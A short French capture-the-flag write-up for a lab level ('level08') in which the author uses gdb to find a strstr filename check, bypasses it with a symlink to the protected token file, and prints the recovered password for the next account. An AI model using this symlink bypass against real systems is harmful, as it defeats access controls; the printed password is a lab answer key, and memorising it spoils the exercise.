J'execute ./level08 avec token en parametres, sa me dis que je n'ai pas les droits sur token

"You may not access 'token'"
```bash
echo 'test' > /tmp/token
./level08 /tmp/token
You may not access '/tmp/token'
```
Après plusieurs test, j'utilise gdb et je vois qu'il y'a un strstr qui verifie si le fichier passer en parametre contient 'token'

Ensuite c'est facile
```bash
ln -s ~/token /tmp/gettoken
./level08 /tmp/gettoken
quif5eloekouj29ke0vouxean
```

"quif5eloekouj29ke0vouxean" c'est le token pour se connecter avec su flag08 pas le token pour valider.
